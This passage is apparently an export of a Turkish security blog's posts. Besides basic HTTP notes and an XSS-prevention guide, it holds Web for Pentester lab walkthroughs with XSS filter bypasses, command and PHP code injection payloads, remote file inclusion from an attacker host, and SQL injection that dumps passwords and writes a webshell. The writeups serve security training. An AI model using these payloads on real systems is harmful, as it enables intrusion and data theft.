\"Dosya Boyutu\", MB_ICONASTERISK); //Handle sonlandırılmıştır. CloseHandle(hFileRead); return 0; }","tags":"c++","title":"C++ ve MSDN"},{"url":"http://www.mazlumagar.com/linux-network-disabled.html","text":"İnternette dolaşırken bir anda bağlantınız kesildi. Bağlantılara baktığınızda ise Network Disabled hatası görüyorsanız vermeniz komutlar sırası ile şu şekilde. $ sudo service network-manager stop $ sudo rm /var/lib/NetworkManager/NetworkManager.state $ sudo service network-manager start Bu komutlardan sonra sıkıntı ortadan kalkacaktır.","tags":"Linux","title":"Linux Network Disabled"},{"url":"http://www.mazlumagar.com/http-durum-kodlari.html","text":"Bir web sayfasına istek yapıldıktan sonra HTTP protokolü bize yanıt olarak kod döndürür. Bu kodlardan biz ulaşmak istediğimiz web sayfasının durumunu anlayabiliriz. 1xx Kod Ailesi Bilgilendirme. 100 : Continue -Devam- 101 : Switching Protocols -Anahtarlama Protokolü- 2xx Kod Ailesi Başarılı. Eğer bu aileden bir kod dönerse her şey yolunda demektir. 200 : OK -Tamam- 201 : Created -Oluşturuldu- 202 : Accepted -Onaylandı- 3xx Kod Ailesi Yönlendirme. Sayfaların taşınması durumunda döner. 300 : OK -Tamam- 301 : Moved Permanently -Sürekli Taşındı- 302 : Moved Temporarily -Geçici Taşındı- 4xx Kod Ailesi Hata. İstekte hata oluşmasında bu kodlar döndürülür. Ama bu hatalar kullanıcı kaynaklı hatalardır. 400 : Bad Request -Kötü İstek- 403 : Forbidden -Erişim Yasak- 404 : Not Found -Sayfa Bulunamadı- 5xx Kod Ailesi Hata. Bu hata kullanıcı kaynaklı değil sunucu kaynaklıdır. 500 : Internal Server Error -Sunucu Hatası- Not : Tüm hata kodlarına yer verilmemiştir. En çok karşılaşılanlar sadece yazılmıştır.","tags":"Web","title":"Http Durum Kodları"},{"url":"http://www.mazlumagar.com/http-istek-metodlari.html","text":"İnternette dolanırken herhangi bir siteye girmek için tarayıcımızdan url adresini girinci tarayıcımız bizim için siteye istek yapar ve dönen değeri yorumlayarak bize gösterir. Peki biz dolaşırken hangi istek metodlarını kullanırız? Daha çok kullandıklarımız GET ve POST metodlarıdır. Örneğin mazlumagar.com adresini görüntülemek için tarayıcıda adres çubuğuna yazdıktan sonra tıkladığımızda GET isteği oluşur. Herhangi bir yazı altına yorum yaptığımızda ise POST metodu oluşabilir. Tüm istek metodları bunlar değil. Bu yazıda kısa bir şekilde bu istek metodlarından bahsedeceğim. İşleyeceğimiz metodların bir kısmı (TRACE,PUT,HEAD gibi) güvenlik sebebi ile sunucu tarafından engellenebilir. Bu aslında iyi bir yöntemdir. Çünkü yapılmak istenen bir işlem başka bir metod kullanılarak sunucuya yaptırtılabilir. GET Metodu GET metodu sunucudan dosya/veri almak için kullanılır. Bunun dışında sunucuya veride gönderilebilir. Örneğin şöyle bir kullanımda sunucuya veri gönderilmiş olur. mazlumagar.com?veri=\"gonderilen_veri\" Eğer güvenlik söz konusu ise veri gönderim işlemi bu yöntem ile yapılmamalıdır. Çünkü gönderilen veri kullanıcı tarafından doğruca görülebilmektedir. Ve gönderilen verinin boyut olarak bi sınırı vardır. İstediğimiz uzunlukta veri gönderemiyoruz. Tabi kullanmak zorunda kaldığımız durumlar olabiliyor. Örneğin blog içerisindeki sayfalama işlemi için ideal bir yöntem olabilir. HEAD Metodu Aslında GET metodu ile işlem olarak aynı işi yapar. Yani gönderilen veri aynıdır. Sunucuda olan işlemler aynıdır. Fakat sunucu cevap dönerken sadece HEADER kısmını döner. Ama sunucuda olan işlemler açısından GET ile bir fark yoktur. Örneğin burada yaptırılmak istenen bir durum GET veya POST ile yaptırılamıyorsa HEAD ile yaptırılabilir. POST Metodu Sunucuya veri göndermek için kullanılır. Fakat burada veriler HEADER kısmında değilde BODY kısmında gönderilir. Bundan dolayı tarayıcıda gönderilen değerler görülmez. Tabi giden değerler clear text olarak gittiği için bize güvenliği sağlamaz. Herhangi bir proxy ile araya girilerek değerler rahat bir şekilde değiştirilebilir. Bir diğer avantajı ise gönderilen değerlerin uzunluk sınırı yoktur. Bundan dolayı sunucuya istenilen büyüklükte veriler bu metod ile gönderilebilir. Form istekleri daha çok bu metod ile yapılır. PUT Metodu Sunucuya veri göndermek için ama gönderilen veriler ile bir dosya yaratmak için kullanılır. Eğer dosya sunucuda varsa üzerinde değişiklikler yapar. TRACE Metodu Sunucuyu kontrol amaçlı kullanılabilir. Bunun yanında başka bir sunucu üzerinde işlem yapmak için de kullanılabilir. OPTIONS Metodu Sunucunun hangi metodları kabul ettiğini öğrenmek için kullanılır. DELETE Metodu Sunucuda ki kaynağı silmek için kullanılır. Silme işlemini yaparken kaynağı sorgulamadan bu işlemi yapar. CONNECTION Metodu Suncuyu proxy gibi kullanabilmemizi sağlar. Yani sunucunun başka bir sunucuya istek yapmasını sağlayabiliriz. Bu metodların hepsinin sunucuda kabul edilir olması tehlikeli bir durumdur. Bir web sayfası için GET ve POST metodları yeterlidir.","tags":"Web","title":"HTTP İstek Metodları"},{"url":"http://www.mazlumagar.com/xssden-korunma-yontemleri.html","text":"Linux Yaz Kampında Web Uygulama Güvenliği ve Güvenli Kod Geliştirme eğitimine devam ediyoruz. Bugün Mehmet Hocamız bizimle ve konumuz XSS. Tüm gün XSS işliyoruz. Ben bu yazıda XSS nedir? yada saldırı yöntemleri nelerdir? gibi başlıklara değinmeyeceğim. XSS'den korunma yöntemi nedir? Mehmet hoca bize bunu anlattı ve gerçekten de çok zor olmadığını gördüm. Bende hemen paylaşayım dedim. Çünkü gerçeken önemli bir konu. Ama savunma yöntemlerinden bahsetmeden önce kısaca Context kavramından bahsetmemiz gerekiyor. Context Context yazılan değerin hangi çalışma alanında olduğunu belirtir. Yani web sayfasında bir değer gösteriyoruz yada işlem yapıyoruz ama bu işlem hangi çalışma alanında. Bu çalışma alanları şunlardır. Html Context Javascript Context Attribute Context İşte kullanıcıdan aldığımız değerleri bu alanlar içerisinde kullanıyoruz. Savunma kısmımızda bu alanlara göre değişiklik gösteriyor. Bunun için kullanıcıdan aldığımız değeri nerede kullanacağımız çok önemlidir. İlk önce bunu tespit ederek ondan sonra savunma işlemine geçmeliyiz. Peki bu contextlere göre savunma işlemi nasıl olur? Html Context Kullanıcıdan aldığımız değeri eğer Html Contexti içerisinde kullanıyorsak savunmamızı ona göre yapacağız. Örneğin sayfamızda arama formu var ve kullanıcıdan aldığımız değeri tekrardan kullanıcıya aranan değer: \"girilen değer\" şeklinde tekrar gösteriyoruz. İşte burada yaptığımız işlem html context içerisinde kullanıcıya değeri tekrar göstermek. Kullanıcı burada ne yapabilir? x.com/?arama= <script> alert(1); </script> Bu yazdığı değer doğrudan html içerisine yazılacak ve script tagları arasına yazdığı javascript kodları çalışacaktır. Burada dikkat etmemiz gereken kullanıcı burada javascript kodu çalıştırabilmek için kesinlikle bir <script> tagı başlatmak zorundadır. Eğer bu tagı başlatamaz ise javascript kodunu çalıştıramaz. İşte bu yüzden \"<\" ifadesini encode etmeliyiz. Yani < ifadesine dönüştürmeliyiz. Eğer bu dönüşümü yaparsak tarayıcı bunu tag başlangıcı olarak algılamayacak ve kullanıcı hiç bir zaman tag başlatamayacağı için javascript kodlarını çalıştıramayacaktır. Javascript Contex Javascript context'i ise kullanıcıdan alınan değerlerin doğrudan javascript kodları arasında kullanılmasıdır. window.onload = function() { document.getElementById('icerik').innerHTML = 'hack'; Gördüğünüz gibi kullanıcıdan alınan hack ifadesi doğrudan innerHTML ile birlikte kullanıcıya gösterilmiş. İşte bu alınan değer HTML context içerisine düşmediği için burada script tagı başlatmak bir anlam ifade etmeyecektir. Çünkü zaten script tagı başlatılmış durumdadır. İşte saldırgan burada şöyle bir değer gönderirse; hack';alert(1);f=' Bu ifade yazıldığında ise javascript kodları şu hale dönüşecektir: window.onload = function() { document.getElementById('icerik').innerHTML = 'hack';alert(1);f=''; Gördüğünüz gibi saldırgan javascaript kodu çalıştırabildi. İşte burada bundan kurtulmanın yolu ‘ ifadesinin \\\\' şeklinde gösterilmesidir. Bu şekilde ‘ ifadesi işlevini kaybedeceği için içeriden hiç çıkılamayacak ve javascript kodu çalıştırılamayacaktır. Ama çok önemli bir nokta bu kullanımda javascript içerisindeki kullanımlarda her zaman ‘ kullanılmalıdır. Onun yerine bazen \" kullanılmamalıdır. Peki bunun dışında saldırgan script ifadesini yazarsa ne olur? İşte bu durumda başlatılmış olan script tagı sonlanır ve kullanıcı html contexti içerisine düşer. Bundan dolayı artık istediği saldırıyı yapabilir. Bundan kurtulmak için Javascript contexti içerisinde \"<\" ifadesinin de encode edilmesi gerekir. Html Attribute Context Html attribute contexten kastımız <div id=\"ozellik\"> buradaki id değeri bir attribute'dır. Örneğin şöyle bir kullanımı düşünelim. <button width= \"deger\" ></button> Buradaki deger ifadesinin kullanıcıdan alındığını düşünelim. Eğer saldırgan burada şöyle bir ifade gönderirse ne olur? 10\" onclick=\"alert(1)\" Durum şu hale döner: <button width= 10\" onclick= \"alert(1)\" ></button> Ve kullanıcı butona tıkladığı anda javascript kodları çalışacaktır. Bunun engellemenin yolu ise gösterilecek \" ifadesinin encode edilerek \" şeklinde gösterilmesidir. Bu şekilde kullanıcı başlatılmış olan \" ifadesinden hiç bir zaman kurtulamayacağı için javascript kodlarını çalıştıramayacaktır. Ama burada da yazılımcının dikkat etmesi gereken en önemli nokta tıpkı Javascript Context de yaptığı gibi her zaman \" kullanmalıdır. Ama burada bir tag farklı bir davranış gösteriyor. Bu tag: <a href= \"\" ></a> a tagıdoğrudan javascript çalıştırabilir. Yani : <a href= \"javascript:alert(1)\" ></a> Bu ifadedeki javascript kodları çalışır. Burada yapmış olduğumuz encode işlemi işe yaramaz. Bunun çözümü ise sadece http, https, ve // gibi başlayan url'leri kullanıcıdan almaktır. XXS'ten korunmak için şöyle bir php kod örneği verebiliriz. <?php XSSden korunma ; $url = $_GET [ 'url' ]; function attribute_special_chars ( $str ){ return htmlspecialchars ( $str , ENT_COMPAT ); } //ENT_COMPAT yazarsan sadece çift tırnağı encode eder. function html_special_chars ( $str ){ return htmlspecialchars ( $str , ENT_NOQUOTES ); } function url_a ( $url ){ $p = '/&#94;(((https?)|(\\/\\/))).*/' ; if ( ! preg_match ( $p , $url )) { return \"/\" ; } return $url ; } $url = attribute_special_chars ( $url ); $url = html_special_chars ( $url ); $url = url_a ( $url ); ?> <a href= \" <?php echo $url ; ?> \" > <?php echo $url ; ?> </a>","tags":"Güvenlik","title":"XSS'den Korunma Yöntemleri"},{"url":"http://www.mazlumagar.com/web-for-pentester-xss-bolumleri.html","text":"Web for pentesterin, web uygulamalarında en çok karşılaşılan açıklardan biri olan cross site scripting(xss) bölümlerinin çözümlerini sizlerle paylaşacağım. Bölüm 1 Birinci bölümde herhangi bir filtreleme olmadan kullanıcıdan alınan değer tekrar kullanıcıya yazdırılıyor. Bundan dolayı yazılan javascript kodları basit bir şekilde çalıştırılabiliyor. /xss/example1.php?name= <script> alert(1); </script> Bölüm 2 İkinci bölümde ise kullanıcıdan alınan <script> ve </script> ifadeleri silinerek kullanıcıya gösteriliyor. Bu yüzden doğrudan yazılmması bir anlam ifade etmiyor. Bu filtrelemeyi atlatmak için şu yöntemi kullanabiliriz. /xss/example2.php?name= <sc <script > ript>alert(1); < /s </script> cript> Filtreleme yapılırken sadece script tagı düşünüldüğü için bu bölümü diğer taglar ile de atlatabiliriz. /xss/example2.php?name=<svg onload=\"alert(1)\"> Bölüm 3 Bu bölümü de bir önceki bölümdeki yöntemler ile aşabiliyoruz. Bölüm 4 Dördüncü bölümde ise script ifadesi göründüğü anda kullanıya error döndürülüyor. Yani bu sefer script ifadesi silinmiyor da tamamen bir engelleme yapılıyor. Ama javascript çalıştırabilmek için sadece script tagına ihtiyacımız yok. örneğin svg tagını kullanarak bu bölümü atlatabiliyoruz. /xss/example4.php?name=<svg onload=alert(1)> Bölüm 5 Bu bölümde ise alert ifadesi engellenmiş. Alert'ın alternatifi olan prompt fonksiyonunu kullanarak bölümü aşabiliriz. /xss/example5.php?name= <script> prompt(1); </script> Bölüm 6 Bu bölümde alınan ifade javascript içerisinde şu şekilde kullanılıyor. var $ a = \"hacker\"; Yani kullanıcı ne yazarsa tırnaklar içerisinde kullanılarak ekrana bastırılıyor. İşte burada kullanıcı tırnak içerisinden çıkarak kendi javscript kodlarını çalıştırabilir. Kullanılması gereken ifade ise şu şekildedir. /xss/example6.php?name=hacker\";alert(1);f=\" Bu ifade gönderildikten sonra javascript kodları şu hale dönüyor. En sonda yazılan f değeri syntax hatasından kurtulmak içindir. var $ a = \"hacker\";alert(1);f=\"\"; Bölüm 7 Yedinci bölümün altıncı bölümden tek farkı javascript içerisinde \" yerine ' kullanılmasıdır. Geri kalan işlemler aynı. /xss/example7.php?name=hacker';alert(1);f=' Bölüm 8 Bölüm 8 biraz farklı. Buradaki form elementinin action attribute incelenmelidir. urlden gelen değer ne ise action kısmı odur. Biz de bu durumdan yararlanacağız. /xss/example8.php/\" onmouseover=\"alert(1); Bu ifade yazıldıktan sonra formun son hali şu şekilde olduğu için formun her üstüne gelindiğinde istediğimiz javascript kodları çalışacaktır. Bölüm 9 Dokuzuncu bölümde dom xss bulunmaktadır. # ifadesinden sonra alınan kısım ekrana bastırılmıştır. /xss/example9.php/# <script> alert(1); </script>","tags":"Güvenlik","title":"Web for Pentester - XSS Bölümleri"},{"url":"http://www.mazlumagar.com/web-for-pentester-file-include-bolumleri-2.html","text":"File include zafiyetleri kullanıcıdan resim gibi dosya yüklenmesi istenilen yerlerde oluşur. Programlama dili dosyları yüklenerek bu dosyalar çalıştırılabilir. Bölüm 1 Bu bölümde kullanıcıdan resim dosyası yüklemesi istenmiştir. Ama gelen dosyanın resim mi yoksa başka bir dosya mı olduğu kontrol edilmemiştir. Yani doğrudan bir php dosyası yüklenerek çalıştırılabilir. Bölüm 2 Bu bölümde ise yüklenen dosyanın uzantısı kontrol edilmiş ve php olanlar kabul edilmemiştir. Ama black list metodu kullanılarak yapılan bu yöntem atlatılabilmektedir. Bunun yerine \"dosyadi.php.\" \"dosyadi.php?\" Bu şekilde denenen dosyalar çalıştılabilmektedir. Bunun yanında .phtml uzantılı dosyalar da php yorumlayıcısı tarafından yorumlanmaktadır. Bu uzantılı dosyalar ile de filtreleme atlatılabilmektedir. http://10.47.78.162/upload/images/upload.phtml","tags":"Güvenlik","title":"Web for Pentester - File Include Bölümleri"},{"url":"http://www.mazlumagar.com/web-for-pentester-command-injection-bolumleri.html","text":"Command injection çalıştırılan sistem komutlarının kullanıcıdan alınması durumlarında olur. Tabi bu da her zaman ki gibi kullanıcıdan alınan değerlerin kontrolsüz bir şekilde kullanılmasından kaynaklanır. Bölüm 1 Bu bölümde kullanıcırarak yapabiliyoruz. Yani komut satırından şöyle bir değer gönderirsek bizim için çalışacaktır. ping 127.0.0.1;ls İşte bu şekilde url'den girdiğimiz komutları da çalıştırabiliriz. /commandexec/example1.php?ip=127.0.0.1;ls Gördüğünüz gibi ping komutu yanında yazdığımız ls komutunu çalıştırarak dizin içerisini listeleyebildik. Bölüm 2 Bu bölümde kullanıcıdan alınan değer doğrudan kullanılmayarak gerçekten bir ip adresimi değil mi bunun kontrolü yapılmış. Ama burada kullanıcıdan gelen değer sanki tek satır olabilir gibi düşünülmüş. Gerçekten de öyle sonuç olarak url tek satırlık bir alan ve normal bir kullanıcı buraya ikinci bir satır giremez. Ama biz %0A ifadesinin yeni satır anlamına geldiğini bildiğimiz için bunu kullanabiliriz. /commandexec/example2.php?ip=127.0.0.1%0Als -al; cat ../../../../../../etc/passwd Burada ilk satırda bir ip adresi gittiği için filtreleme kısmını atlatabildik. Bölüm 3 Bu bölümde de bir önceki bölümde olduğu gibi ip filtrelemesi var. Programcı ip adresi eğer düzgün değilse redirect işlemi yapıyor. Ama şöyle bir mantık hatası var kodlar çalıştıktan sonra redirect işlemi var. Yani bizim gönderdiğimiz kodlar aslında çalışıyor ama biz çıktıyı ekranda göremiyoruz. Çıktıyı ekranda görebilmek için ise netcat programını kullanacağız. Bu yüzden ilk linux komut satırından netcat ile web for pentesterın kurulu olduğu ip adresine bağlantı açıyoruz. nc 172.16.248.132 80 -v Daha sonra ise aynı sayfaya bir get isteğini yapıyoruz. GET http :// 172 .16.248.132 / commandexec / example3 .php ? ip = 127 .0.0.1 ; ls HTTP \\ 1 .0 Eğer çıktıyı incelerseniz dizin içerisinin listelendiğini görebilirsiniz. Eğer isterseniz netcat ile bu isteği şu şekilde tek satırda da yapabilirsiniz. echo -e \"GET http://172.16.248.132/commandexec/example3.php?ip=127.0.0.1;cat%20/etc/passwd HTTP/1.0 \\n\\r\\n\\r\" | nc 172 .16.248.132 80 -v","tags":"Güvenlik","title":"Web for Pentester - Command injection Bölümleri"},{"url":"http://www.mazlumagar.com/web-for-pentester-code-injection-bolumleri.html","text":"Kod injection zafiyeti mantık olarak sql injection zafiyeti ile aynıdır. Sql injectionda nasıl istediğimiz mysql sorgularını çalıştırabiliyorsak bu zafiyette de istediğimiz kod parçacıklarını çalıştırabiliyoruz. Bu kodlar programlama diline göre değişecektir. Ama burada kullanılan dil php olduğu için php kodları yazacağız. Bu zafiyet kullanıcıdan alınan değerin hiç bir kontrolden geçirilmemesinden kaynaklanır. Bu açıktan faydalanabilmek için ilk yapmamız gereken ekrana bir hata bastırmaktır. Bu hatayı bastırmayı başarabilirsek ona göre yorum yapabilmemiz kolaylaşacaktır. Bölüm 1 Bu bölümde kullanıcıdan alınan ifade doğrudan kod içerisine yazılmış. Bu yüzden yazdığımız php kodları yorumlanacaktır. Hemen deneyelim. /codeexec/example1.php?name=hacer\"; $ name = \" kod\"; echo $ name ; // Gördüğünüz gibi ekrana bizim oluşturmuş olduğumuz \\$name değişkeni de yazıldı. En sonda kullandığımız // ifadesi geri kalan ifadeleri yorum olarak görülmesini sağlayacak ve bizi syntax hatasından kurtaracaktır. Php'pinin system fonksiyonunu kullanarak sistem komutları çalıştırabiliriz. /codeexec/example1.php?name=hacer\"; system(\"ls\"); // Dizin içerisinde bulunan tüm dosyalar listelendi. Bölüm 2 Burada php'nin usort fonksiyonu kullanılmış. Yapmamız gereken code injection zafiyetini tespit ettikten sonra bu fonksiyonun nasıl kullanıldığını anlamak. Google amcayı kullanarak ilk önce fonksiyonun nasıl kullanıldığını öğreniyoruz. Daha sonra ona göre hareket edebiliriz. Açığı exploit edebilmek için yazmamız gereken ifade şu şekilde. /codeexec/example2.php?order=id);}system('ls');%23 Burada php bizim istediğimiz gibi dosya içeriklerini listeleyecek ve bununla beraber ekrana hata basacaktır. Ama bu hata bizim için önemli değil çünkü istediğimizi aldık. Bölüm 3 Bu bölümde biraz extra bir durum söz konusu. Zaten Barkın hocanın yardımı olmasa biz de çözemezdik. Burada phpnin preg_replace() fonksiyonu kullanılmış. Bu fonksiyon kullanımı şu şekilde: preg_replace( $ pattern , $ new , $ base ); php burada aldığı pattern regex'ine göre \\$base değişkeni içerisinde değişlik yaparak \\$new ifadesini koyuyor. Bilinmesi gereken ise regex ifadesi ile atraksiyonlar yapılabildiği. Burada eğer regex ifadenin en sonuna \"e\" yazılırsa \\$new ile gelen ifade php tarafından bir fonksiyon olarak yorumlanıyor. /codeexec/example3.php?new=phpinfo()&pattern=/lamer/e&base=Hello lamer phpinfo() fonksiyonunu çalışıtırabildik. Bu şekilde istenilen fonksiyo çalıştırılabilir. /codeexec/example3.php?new=system(\"ls\")&pattern=/lamer/e&base=Hello lamer Bölüm 4 Bu bölümde ise hacker' ifadesini parametre olarak verdiğimiz zaman karşımıza çıkan hatadan phpnin assert() fonksiyonunun kullanıldığını görebiliyoruz. Burada şu ifadeyi yazarak istediğimiz fonksiyonu çalıştırabiliriz. /codeexec/example4.php?name=hacker'.system(\"ls\");%23 Code injection zafiyetlerinde programlama dilinin kullanılan fonksiyonu tespit edildikten sonra ona göre hareket ederek istediğimiz işlemleri yapabiliyoruz.","tags":"Güvenlik","title":"Web for Pentester - Code injection Bölümleri"},{"url":"http://www.mazlumagar.com/web-for-pentester-file-include-bolumleri.html","text":"ıyorsa burada güvenlik açıkları oluşabilir. Bu açık sayesinde kullanıcı sunucuda herhangi bir dosyanın içe aktarımın sağlayarak istediği davranışları yapabilir. Bölüm 1 Bu bölümde kullanıcıdan ismi alınan dosya içe aktarılmıştır. Peki bu dosya aktarılırken kontrol yapılmış mı? Kontrol edelim mi? url'deki page parametresine /etc/passwd değerini verelim. /fileincl/example1.php?page=/etc/passwd Gördüğünüz gibi hiç bir kontrol yapılmadığı için /etc/passwd dosyası doğrudan ekrana basıldı. Buradaki zafiyetten yararlanarak sunucuya kendi oluşturduğumuz php dosyasının yüklenmesini sağlayarak kendi kodlarımızı çalıştırabiliriz. /fileincl/example1.php?page=http://172.16.248.129/index.php Bölüm 2 Bu bölümde ise kullanıcıdan dosya ismi alınırken uzantısı alınmamış. Uzantı ekleme işlemi programcı tarafıdan kod kısmında yapılmıştır. İşte bunu atlatabilmek için bir kaç yöntem kullanabiliriz. http://172.16.248.132/fileincl/example2.php?page=http://172.16.248.129/index Bu şekilde kendi oluşturduğumuz dosyanın sonuna uzantısını vermeden yüklenmesini sağlayabiliriz. Veya daha php'nin güzelliklerinden faydalanabiliriz. Php null karakterini eğer görürse geriye kalan kodları çalıştırmaz. Null'u ise tarayıcıdan gönderebilmek için encode halini yani %00 ifadesini kullanmamız gerekiyor. 172.16.248.132/fileincl/example2.php?page=http://google.com%00 Bu şekilde kullanıcının yazmış olduğu uzantıyı iptal ettik ve syntax hatasından kurtulmuş olduk. Yine bu syntax hatasından kurtulmanın başka bir yöntemi ise sunucuya çöp değer göndermek. Bunu ise şu şekilde yapabiliriz. http://172.16.248.132/fileincl/example2.php?page=http://172.16.248.129/index.php?cop= Buradaki cop ifadesi çöp değer oldu ve %00 yaptığı aynı işi yaparak bizi syntax hatasından kurtardı.","tags":"Güvenlik","title":"Web For Pentester - File Include Bölümleri"},{"url":"http://www.mazlumagar.com/web-for-pentester-sql-injections-bolumleri.html","text":"Merhabalar, Şuan Linux Yaz Kampında Barkın Kılıç ve Mehmet İnce'nin Web Uygulama Güvenliği ve Güvenli Kod Geliştirme Eğitimindeyiz. Eğitim oldukça eğlenceli ve faydalı bir şekilde devam etmekte. Bugün Sqli konusu anlatıldıktan sonra eğitmenler tarafından Web for Pentester içerisindeki Sql bölümlerini kendi başımıza çözmemiz istendi. Bizde Barkın hocamızdan aldığımız ufak yardımlarla hepsini hallettik. Bende burada sizlerle paylaşayım dedim. Bölüm 1 İlk bölüm oldukça basit ve doğrudan sql ifadesi girilebiliyor. Yapmamız gereken sadece tırnak ifadesine dikkat ederek syntax hatasından kurtulmak. Hemen girdiğimiz urli yazalım. http://172.16.248.132/sqli/example1.php?name=root' or '1'='1 Gördüğünüz gibi yazdığımız bu ifade ile tüm kullanıcıları listeleyebildik. Bu ifade arkada nasıl bir sql sorgusu çalıştırıyor derseniz çalıştırdığı sql sorgusu ise şu şekilde: Select * from users where id='root' or '1'='1' Burada tırnaklara dikkat etmeniz gerekiyor. Gördüğünüz gibi sql sorgusu ile tüm kullanıcıları listeledik. Başka neler yapabiliriz? Burada union ifadesini kullanarak veritabanındaki tüm tabloların isimlerini alabiliriz. http://172.16.248.132/sqli/example1.php?name=kk' union select table_name,2, 3,4,5 FROM information_schema.tables %23 Sondaki %23 ifadesi # işaretinin encode edilmiş halidir. # ifadesi ise mysqlde yorum satırı demek olduğu için ondan sonraki tüm ifadeler geçersiz kılınacak ve bu şekilde syntax hatasından kurtulmuş olacağız. Kullanılan versionu öğrenebiliriz. http://172.16.248.132/sqli/example1.php?name=kk' union select @@version,2,3,4,5 %23 Burada union ifadesi kullanılırken neden 2,3,4,5 ifadesini yazdığımız aklınızı kurcalamıştır. Union ifadesi iki tabloyu birleştirerek tek bir sonuç kümesinde verme işlemini yapar. Ama bu işlem yapılırken iki tabloda çekilen sutun sayısının aynı olmasını ister. Burada ilk tabloda 5 sutun çekildiği için union ifadesinde de 5 sutun çekildi. Peki kaç sütün çekildğini nereden öğreneceğiz? Bu birazcık deneme yanılma yöntemi. Buradaki sqli açığı herhangi bir dosyayı okumak için kullanılabilir. Tabi dosya okuma işleminin gerçekleşebilmesi için mysql kullanıcısının bu yetkisinin olması gerekir. Aksi halde yetkisinin olmadığı dosyaları okuyamayız. Dosya okumak için şu ifadeyi kullanabiliriz. http://172.16.248.132/sqli/example1.php?name=root' union select 1,load_file('/etc/passwd'),3,4,5 %23 Gördüğünüz gibi /etc/passwd dosyasının içeriği önümüze geldi. Okuduğumuz gibi bir php dosyası oluşturmak içinde kullanabiliriz. ?name=root' union select '',2,3,4,5 into outfile '/var/www/sqli/cmd.php' %23 Burada aldığı ifadeyi çalıştıran bir php dosyası oluşturduk. Tabi bu dosyayı bu şekilde oluşturabilmek için dizinde yazma izninin olması gerekir. Bu dosyaya artık bir shell ifadesi parametre olarak gönderirsek bu çalışıcak demektir. http://172.16.248.132/sqli/cmd.php?cmd=cat%20/etc/passwd Burada /etc/passwd dosyasını ekrana bastıran bir komut çalıştırmış olduk. Bölüm 2 Bu bölümde ilk bölümden farklı olarak sadece boşluk karakteri kullanmamıza izin verilmiyor. Yani burada bir black box tekniği kullanılmış. Bu teknik ile %20 ifadesi var ise hata ver denilmiş. Biz bunu nasıl atlatacağız . Boşluk ifadesi yerine tab ifadesinin encode hali olan %09 ifadesini kullanabiliriz. http://172.16.248.132/sqli/example2.php?name=root%27%09or%09%271%27=%271 Bölüm 3 Bu bölümde ise boşluk filtrelemesinin yanında %09 ve %06 filtrelemeleri yapılmış. O yüzden boşluk ifadelerini atlatmamız gerekiyor. Bunu phpinin yorum satırları ile halledebiliyoruz. Kullanmamız gereken ifade şu şekilde. http://172.16.248.132/sqli/example3.php?name=root'/**/or/**/'1'='1 Bölüm 4 Bu bölümde ise herhangi filtreleme yok. Ama ilk bölümden farkı programcı değişkeni sorguya gömerken tırnak ifadeleri kullanmamış. Bu yüzden ilk bölümde yaptığımız tırnak açıp kapama işlemini yapmıyoruz. Doğrudan yazacağımız şu ifade bizim için yeterli olacak. http://172.16.248.132/sqli/example4.php?id=2 or 1=1 Tüm kullanıcıların şifrelerini görebileceğimiz ifadeyi yazalım. http://172.16.248.132/sqli/example4.php?id=2 union select name,passwd,3,4,5 from users Bölüm 5 Bu bölümde girilen değere bir integer kontrolü yapılmış. Ama şu şekilde bir ifade ile sorunsuz verileri çekebiliyoruz. http://172.16.248.132/sqli/example5.php?id=2 union select name, passwd,3,4,5 from users Bölüm 6 Bu bölümde de bir integer kontrolü var ama bu kontrol şu şekilde çalışıyor girilen ifadenin başına ve sonuna bakıyor eğer integer ise sorun yok integer değilse kullanıcıya hata döndürüyor. Yani şu ifade sıkıntısız çalışıyor. Çünkü başında ve sonuda integer ifadeler var. http://172.16.248.132/sqli/example6.php?id=2 or 1=1 Ama eğer biz gelip union ile şu ifadeyi yazarsak sonu integer ile bitmediği için hata veriyor. http://172.16.248.132/sqli/example6.php?id=2 union select name,passwd,3,4,5 from users İşte bunu nasıl aşabiliriz. Ne demiştik ifadenin sonu eğer integer ise sorun vermiyor. Burada integer değil. Bu sorunu aşmak için yorum satırı anlamına gelen # ve ardından herhangi bir sayı yazacağız. İfademiz şu şekilde olacak. http://172.16.248.132/sqli/example6.php?id=2 union select name,passwd,3,4,5 from users %23 1 Buradaki %23 yani # ifadesi mysql için kendinden sonrasını yorum satırı yapacak ve syntax hatası almayacağız. En sondaki 1 ifadesi ise filtrelemeyi aşmamızı sağlayacak. Bölüm 7 Bu bölümde de bir integer filtrelemesi var. Ama bir önceki bölümden farkı ifadenin başına ve sonuna değil tamamına bakıyor. Bundan dolayı az önceki yöntem bizim filtrelemeyi aşmamızı sağlamıyor. Burada farklı bir durum var alınan ifade satır satır alınıyor ve alınan en son satırdaki ifade integer ise filtreleme sorun vermiyor. Bizimde normalde bir satır ifade göndermemiz beklendiği için bu filtrelemenin aşılmaması gerekiyor. Fakat biz burada new line encode hali olan %0a ifadesini kullanacağız. Bu ifade bir alt satıra geç demek, program bir alt satıra geçecek ve geçtikten sonraki ifade eğer integer ise hata vermeyecek. http://172.16.248.132/sqli/example7.php?id=2 or 1=1 %23%0A1 %23 (#) ifadesinin neden olduğunu artık tahmin edebiliyorsunudur. Aynı şekilde kullanıcı şifrelerini de alalım. http://172.16.248.132/sqli/example7.php?id=2 union select name,passwd,3,4,5 from users %23%0A1 Bölüm 8 Bu bölümde ise order by kullanıldığı belli oluyor. Ama order by sql ifadesinin en sonunda olduğu için bu sql injection bi işimize yaramayacaktır. Herhangi bir yere sıçrayarak veri elde edemeyiz. Bu sadece sql injection var diyebileceğimiz bir alandır. İfade şu şekilde olacaktır. http://172.16.248.132/sqli/example8.php?order=name` desc %23 Dikkat etmeniz gereken tırnak ifadesi ' ( Shift + 2) ile yapılan değildir. Buradaki tırnak ifadesi ` (AltGr + ;)dir. Bölüm 9 8. Bölümün aynısıdır. Ama tırnak işaretini koymamıza gerek yok. http://172.16.248.132/sqli/example8.php?order=name` desc %23 Web for Pentester'ın Sql Injection bölümleri bu kadar. Faydalı olması dileğiyle. Kolay gelsin.","tags":"Güvenlik","title":"Web for Pentester - SQL injections Bölümleri"},{"url":"http://www.mazlumagar.com/web-for-pentester-directory-traversal-bolumleri.html","text":"Dün çözmüş olduğumuz sql injection bölümlerini yazmıştım. Aynı sistem üzerinden derslerimizi işlemeye devam ediyoruz. Bugünde Directory traversal bölümlerini yazacağım. Bu bölüm sql injection kadar uzun değil. Burada dikkat ederseniz sadece resimler var. Bu resimler üzerinde ise bir link bulunmamakta. Bu resimlerin bulunduğu url ulaşabilmek için sağ tıklayarak konumunu kopyalayabilirsiniz. Herhangi bir sitede gösterilen bir dosyanın ismi kullanıcıdan alınabilir. 